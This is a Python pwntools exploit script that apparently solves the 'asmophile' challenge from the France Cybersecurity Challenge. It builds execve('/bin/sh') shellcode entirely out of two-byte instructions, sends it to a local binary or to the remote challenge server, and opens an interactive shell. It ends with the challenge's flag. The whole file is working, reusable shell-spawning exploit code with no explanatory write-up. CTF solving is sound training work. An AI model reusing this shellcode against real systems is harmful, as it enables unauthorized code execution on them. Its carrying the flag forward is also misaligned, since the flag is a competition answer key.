from pwn import *
import sys

instructions = list()
instructions.append("mov al, 59")
instructions.append("pop rsi\npop rsi")
instructions.append("push rsi\npop rdx")
instructions.append("pop rdi\npop rdi")
instructions.append("pop rdi\npop rdi")
instructions.append("pop rdi\npop rdi")
instructions.append("pop rdi\npop rdi")
instructions.append("push rsp\npop rdi")
instructions.append("syscall")

shellcode = b""
for instru in instructions:
    assert len(asm(instru, arch="amd64", bits=64)) == 2, (instru, asm(instru, arch="amd64", bits=64))
    shellcode += asm(instru, arch="amd64", bits=64)

shellcode += b"///////bin/sh\x00"
print(shellcode)

if len(sys.argv) > 1:
    if sys.argv[1] == "gdb":
        r = gdb.debug("./asmophile", gdbscript="""
source ~/.gdbinit-gef.py
b*main+593
c
""")
    elif sys.argv[1] == "remote":
        r = remote("challenges2.france-cybersecurity-challenge.fr", 4000)
else:
    r = process("./asmophile")

r.recvuntil("assembly?\n")
r.sendline(shellcode)
r.interactive()

# FCSC{3d3aaf328341c207016b20afd005a60a6311e5238380b1fa0d697f3a544ca283}
